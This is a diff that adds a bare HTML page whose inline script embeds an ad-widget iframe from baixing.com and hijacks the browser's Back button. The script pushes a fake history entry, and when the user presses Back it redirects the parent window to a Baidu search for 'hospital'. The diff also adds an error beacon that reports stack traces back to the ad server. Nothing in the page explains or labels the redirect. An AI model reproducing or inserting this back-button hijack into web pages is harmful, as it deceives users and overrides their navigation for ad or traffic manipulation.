@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Title</title>
+</head>
+<body>
+<script type="text/javascript">
+    var intercept = {
+        //阻止拦截的方法
+        //添加浏览器历史记录
+        pushHistory: function () {
+            var state = {title: "title", url: "#"};
+            window.history.pushState(state, "title", "#");
+        }
+    };
+    (function () {
+
+        try {
+            var insertPoint;
+            if (document.currentScript) {
+                insertPoint = document.currentScript;
+            } else {
+                var phid = 'w_' + Math.random().toString(36).slice(2);
+                document.write('<div id="' + phid + '" style="display:none"></div>');
+                insertPoint = document.getElementById(phid);
+            }
+            var iframe = document.createElement('iframe');
+
+            iframe.setAttribute('src', '//tu.baixing.com/widget/w/hy-ry01.html');
+            iframe.width = 320;
+            iframe.height = 80;
+            iframe.setAttribute('frameborder', 0);
+            iframe.id = "hy-ry01";
+            iframe.scrolling = "no";
+            iframe.style.display = 'block';
+            insertPoint.parentNode.insertBefore(iframe, insertPoint);
+        } catch (e) {
+            (new Image).src = '//www.baixing.com/c/ev/bxad?action=adwidget-err&mes=' + encodeURIComponent(e.stack)
+        }
+
+        var back = window.sessionStorage.getItem("_da_back");
+        window.sessionStorage.removeItem('_da_back');
+        if (back == null) {
+            intercept.pushHistory();
+            window.addEventListener("popstate", function (e) {
+                window.sessionStorage.setItem("_da_back", '_da_back_da_back');
+                window.parent.location.href = 'https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=0&rsv_idx=1&tn=baiduerr&wd=%E5%8C%BB%E9%99%A2&rsv_pq=9bee1dda000944fe&rsv_t=da3a2xQvtjdA8PTDK6mQumTHpNf8Pkiqc%2Bo4Ya28wE2iwuOsajmDzKx8NpqPIsU&rqlang=cn&rsv_enter=1&rsv_sug2=0&inputT=5154&rsv_sug4=5405'
+            }, false);
+        }
+    })();
+</script>
+
+</body>
+</html>
